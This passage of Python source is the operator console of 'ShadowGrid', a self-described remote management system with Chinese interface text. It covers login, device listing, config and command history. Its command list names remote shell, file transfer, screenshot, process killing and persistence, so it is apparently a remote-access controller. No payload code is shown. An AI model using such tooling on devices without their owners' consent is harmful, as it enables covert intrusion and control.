                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "help":
            print_help()
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}")

def save_config(config_dict):
    """保存配置到文件"""
    try:
        if not CONFIG_DIR.exists():
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        
        config_parser = configparser.ConfigParser()
        config_parser['shadowgrid'] = {}
        
        for key, value in config_dict.items():
            config_parser.set('shadowgrid', key, str(value))
        
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            config_parser.write(f)
    except Exception:
        pass  # 配存失败不影响正常使用


def apply_readline_history(cmd_input):
    """将命令添加到readline历史，如果可用"""
    if HAS_READLINE and cmd_input and not cmd_input.lower().startswith(("history", "!!")):
        import readline
        readline.add_history(cmd_input)
        CMD_HISTORY.append(cmd_input)
    elif not HAS_READLINE and cmd_input and not cmd_input.lower().startswith(("history", "!!")):
        CMD_HISTORY.append(cmd_input)


def add_settings_command_logic():
    """检查并执行settings命令的相关逻辑"""
    import sys
    args = []
    if len(sys.argv) > 1:
        args = sys.argv[1:]
    
    if args and args[0] in ['setting', 'settings', 'config', 'conf']:
        print(f"{LGREEN}[设置]{RESET} ShadowGrid 配置管理:")
        print("  server_url    - 服务器地址")
        print("  last_password  - 上次保存的密码（隐私）")
        print("  last_client_id - 最后连接的客户端ID") 
        print("  last_hostname - 最后使用的主机名")
        print("  auto_remember_password - 自动记住密码（true/false）")
        print("  current       - 所有当前配置")
        print("  reset         - 重置所有配置")
        print("  clear_hist    - 清空命令历史")
        if len(args) > 1:
            setting_name = args[1]
            if setting_name == "server_url":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('server_url', '未设置')}")
            elif setting_name == "last_client_id":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_client_id', '未设置')}")
            elif setting_name == "last_hostname":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_hostname', '未设置')}")
            elif setting_name == "auto_remember_password":
                print(f"{CYAN}[结果]{RESET} {CONFIG.get('auto_remember_password', 'false')}")
            elif setting_name == "current":
                print(f"{CYAN}[当前配置]{RESET}")
                for key, value in CONFIG.items():
                    if key != 'last_password':  # 隐私考虑，不显示密码
                        print(f"  {key}: {value}")
            elif setting_name == "reset":
                CONFIG.clear()
                CONFIG.update({
                    "server_url": "",
                    "last_password": "",
                    "last_client_id": "",
                    "last_hostname": "",
                    "auto_remember_password": "false",
                })
                save_config(CONFIG)
                print(f"{LGREEN}[结果]{RESET} 配置已重置")
            elif setting_name == "clear_hist":
                CMD_HISTORY.clear()
                if HAS_READLINE:
                    import readline
                    readline.clear_history()
                save_history()
                print(f"{LGREEN}[结果]{RESET} 历史记录已清空")
        return True
    return False

def show_splash():
    """显示启动画面"""
    try:
        import splash
        print(splash.get_splash())
    except:
        print("""
  ╔══════════════════════════════════════╗
  ║            SHADOWGRID v1.0           ║
  ║      远程管理系统 - 暗影矩阵         ║
  ╚══════════════════════════════════════╝
        """)

def main():
    """主函数"""
    # 加载配置和命令历史
    load_config()
    
    # 检查是否存在设置命令参数
    if add_settings_command_logic():
        return
    
    show_splash()
    print("[信息] ShadowGrid Admin Console v1.0")
    
    prompt_config()
    
    if not login():
        print("[错误] 登录失败次数过多")
        sys.exit(1)
    
    # 登录成功后自动刷新设备列表
    print(f"{LGREEN}[信息]{RESET} 获取设备列表...")
    try:
        fetch_clients()
        if CLIENTS:
            print_clients()
        else:
            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
    except Exception as e:
        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
    
    print(f"{LGREEN}[信息]{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    
    while True:
        try:
            cmd_input = input(f"{BLUE}srt{RESET}{GRAY}>{RESET} ").strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            break
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue

        # 添加命令到历史记录（如果不是历史相关命令，防止混乱）
        apply_readline_history(cmd_input)
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            break
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "use":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: use <编号>")
                continue
            try:
                num = int(arg)
                if num < 1 or num > len(CLIENTS):
                    print(f"{RED}[错误]{RESET} 无效的设备编号")
                    continue
                selected = CLIENTS[num - 1]
                
                # 保存当前选中的客户端ID和主机名到配置
                CONFIG["last_client_id"] = selected.get("id")
                CONFIG["last_hostname"] = selected.get("hostname", "")
                save_config(CONFIG)
                
                interaction_loop(selected.get("id"), selected.get("hostname"))
            except ValueError:
                print(f"{RED}[错误]{RESET} 无效的设备编号")
        elif cmd == "clear":
            clear_screen()
        elif cmd == "history":
            # 判断参数
            if arg == "-c" or arg == "clear":
                CMD_HISTORY.clear()
                if HAS_READLINE:
                    import readline
                    readline.clear_history()
                save_history()
                print(f"{LGREEN}[历史]{RESET} 命令历史已清空")
            else:
                print(f"{LGREEN}┌─[ 命令历史 ]{RESET}")
                for i, cmd in enumerate(CMD_HISTORY[-20:], 1):  # 最近20条命令
                    print(f"{BLUE}  {i:2}. {RESET}{cmd}")
                print(f"{BLUE}└────────────{RESET}")
        elif cmd == "!!":  # 执行上次的命令
            if CMD_HISTORY:
                last_cmd = CMD_HISTORY[-1]
                print(f"{LGREEN}[执行]{RESET} {last_cmd}")
                print(f"{YELLOW}[提示]{RESET} !!命令重新执行功能待完善，可手动输入历史命令")
            else:
                print(f"{GRAY}[历史]{RESET} 没有历史命令")
        # 智能补全命令
        elif cmd == "compgen":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: compgen <part_of_cmd>")
            else:
                # 自动补全常见命令
                all_cmds = ["list", "use", "back", "clear", "history", "!!", 
                           "help", "quit", "screenshot", "ls", "cd", "pwd", 
                           "cat", "dl", "ud", "rm", "mv", "file", "find", 
                           "shell", "ps", "process", "kill", "terminate", 
                           "persist", "install", "setting", "settings", "config"]
                matching_cmds = [c for c in all_cmds if c.startswith(arg)]
                if matching_cmds:
                    print(f"{GREEN}[补全结果]{RESET}")
                    for m in matching_cmds:
                        print(f"  {m}")
                else:
                    print(f"{GRAY}[补全]{RESET} 未找到匹配的命令")
        # 设置命令 - 在这里添加设置命令
        elif cmd in ["setting", "settings", "config", "conf"]:
            if not arg:
                print(f"{LGREEN}[设置]{RESET} ShadowGrid 配置管理:")
                print("  server_url    - 服务器地址")
                print("  last_client_id - 最后连接的客户端ID") 
                print("  last_hostname - 最后使用的主机名")
                print("  auto_remember_password - 自动记住密码（true/false）")
                print("  current       - 所有当前配置")
                print("  reset         - 重置所有配置")
                print("  clear_hist    - 清空命令历史")
            else:
                setting_name = arg.split()[0] if arg else arg
                if setting_name == "server_url":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('server_url', '未设置')}")
                elif setting_name == "last_client_id":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_client_id', '未设置')}")
                elif setting_name == "last_hostname":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('last_hostname', '未设置')}")
                elif setting_name == "auto_remember_password":
                    print(f"{CYAN}[结果]{RESET} {CONFIG.get('auto_remember_password', 'false')}")
                elif setting_name == "current":
                    print(f"{CYAN}[当前配置]{RESET}")
                    for key, value in CONFIG.items():
                        if key != 'last_password':  # 隐私考虑，不显示密码
                            print(f"  {key}: {value}")
                elif setting_name == "reset":
                    CONFIG.clear()
                    CONFIG.update({
                        "server_url": "",
                        "last_password": "",
                        "last_client_id": "",
                        "last_hostname": "",
                        "auto_remember_password": "false",
                    })
                    save_config(CONFIG)
                    print(f"{LGREEN}[结果]{RESET} 配置已重置")
                elif setting_name == "clear_hist":
                    CMD_HISTORY.clear()
                    if HAS_READLINE:
                        import readline
                        readline.clear_history()
                    save_history()
                    print(f"{LGREEN}[结果]{RESET} 历史记录已清空")
                else:
                    print(f"{RED}[错误]{RESET} 未知设置项: {setting_name}")
        else:
            print(f"{RED}[错误]{RESET} 未知命令: {cmd}。使用 '{YELLOW}help{RESET}' 查看命令列表。")


if __name__ == "__main__":
    try:
        main()
    finally:
        # 退出时保存命令历史记录
        save_history()